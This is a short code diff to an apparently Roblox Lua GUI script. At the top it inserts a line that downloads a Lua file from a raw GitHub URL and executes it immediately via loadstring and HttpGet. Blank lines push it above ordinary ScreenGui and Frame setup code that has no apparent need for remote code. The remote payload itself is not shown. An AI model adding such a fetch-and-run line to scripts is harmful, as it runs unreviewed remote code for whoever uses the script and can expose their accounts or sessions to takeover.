@@ -1,3 +1,7 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/tobi437a/Scripts/refs/heads/main/2849a38fae32ab348851265e.lua'))()
+
+
+
 local TweenService = game:GetService("TweenService")
 local ScreenGui = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
